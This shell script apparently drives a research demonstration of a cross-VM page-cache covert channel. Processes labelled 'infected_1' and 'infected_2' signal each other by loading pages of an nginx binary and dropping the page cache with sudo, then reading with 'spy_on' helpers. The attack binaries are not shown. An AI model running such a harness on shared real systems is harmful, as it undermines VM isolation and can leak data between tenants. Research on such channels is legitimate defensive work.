#!/bin/sh

#read first argument 
TARGET_PAGE=$1
MEASURE_PAGE_COUNT=$2
TARGET_PATH="/usr/sbin/nginx-debug"
SPY_TYPE=""

if [ ! -z $3 ]; then
   TARGET_PATH=$3
fi

if [ ! -z $4 ]; then
   SPY_TYPE=$4
fi


# repeat 100 times, print output only for first and last iteration
echo -e "\n---> [infected_1]: ./read_page $TARGET_PATH $TARGET_PAGE"

for i in $(seq 1 100); do
    if [ $i -eq 1 ] || [ $i -eq 100 ]; then
        echo -e "\nIteration $i:"
        LD_BIND_NOW=1 ./read_page $TARGET_PATH $TARGET_PAGE
    else
        LD_BIND_NOW=1 ./read_page $TARGET_PATH $TARGET_PAGE > /dev/null
    fi
    #drop VM page cache to make qemu read from host page cache again
    echo 1 | sudo tee -a /proc/sys/vm/drop_caches

done

#drop VM page cache to simulate previous reads were done from other VM.
echo 1 | sudo tee -a /proc/sys/vm/drop_caches

echo "========> Last page of $TARGET_PATH is now loaded in the page cache."

#branch depending on spy type
if [ "$SPY_TYPE" = "diff" ]; then
    echo -e "\n---> [infected_2]: ./spy_on_diff $TARGET_PATH"
    LD_BIND_NOW=1 ./spy_on_diff $TARGET_PATH 
else
    echo -e "\n---> [infected_2]: ./spy_on $TARGET_PATH"
    LD_BIND_NOW=1 ./spy_on $TARGET_PATH $MEASURE_PAGE_COUNT
fi
echo -e "========> infected_2 has received the message from infected_1.\n"